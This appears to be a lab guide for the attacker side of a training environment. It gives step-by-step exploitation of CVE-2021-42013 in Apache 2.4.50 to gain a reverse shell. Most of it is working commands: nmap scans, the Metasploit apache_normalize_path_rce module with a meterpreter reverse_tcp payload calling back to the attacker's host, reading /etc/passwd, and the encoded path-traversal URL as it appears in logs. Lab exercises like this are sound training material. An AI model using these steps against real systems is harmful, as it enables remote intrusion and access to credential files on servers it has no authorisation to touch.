# Attacker Environment and Guide

## Overview:
**Target:** Apache Web Server (v2.4.50)

**Vulnerability Exploited:** CVE-2021-42013: Improper Limitation of a Pathname to a Restricted Directory

**Objective:** Get a reverse shell 

---

## Prerequisites
* **Tools Required:** nmap, metasploit-framework
* **Network Setup:** Attacker must be able to route traffic to the server's http port(Usually 80).

## Exploit Execution Steps

### Step 1: Reconnaissance
Verify the server is running and vulnerable.
```bash
ping <server_address>
curl -v "http://<server_address>:<port>/"
```

Use nmap to do a initial active reconnaissance scan.
```bash
nmap -A -T4 <server_address>
```

After getting the initial results, it can be observed that the web service is running on Apache 2.4.50. Run a scan on it using the nmap scripting engine.

```bash
nmap -A -T4 <server_address> -p<apache_port> -sC -vulners
```

Output of the script shows that the server may be vulnerable to CVE-2021-42013. 

We can check that using the metasploit-framework. Refer to the following section for that.


### Step 2: Verification / The Attack
We will use the metasploit-framework to check and run the exploit. The payload will be meterpreter reverse tcp. We will be listening on port 4444 for the reverse shell.
```bash
msfconsole
```
```
msf> search CVE-2021-42013
msf> use exploit/multi/http/apache_normalize_path_rce

msf> set RHOST <server_ip>
msf> set RPORT <apacher_port>
msf> set SSL false

# Check this information uisng this
msf> show options
```
The payload will be set to `linux/x64/meterpreter/reverse_tcp` by default.

Now check if the server is vulnerable by running `check`
```bash
msf> check
```

It will return this output, showing that the server is vulnerable.
```bash
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://<server_ip>:<port> - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[+] <server_ip>:<port> - The target is vulnerable.
```

Now we can run the exploit. Set the local host details and then run the exploit with `exploit` or `run`.
```bash
msf> set LHOST <attacker_ip>
msf> set LPORT 4444

# Run the exploit
msf> exploit
```

### Step 3: Verification of Success
A meterpreter shell will open showing success. You can check the user list by reading the passwd file.
```bash
meterpreter> cat /etc/passwd
```
The user just gained initial access to the server.
## Evidence & Logging
* **Expected Attacker Output:** A meterpreter shell.
* **Server-Side Log:** On the server, volumes/apache_logs/access_log file will show a request with the url `/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh`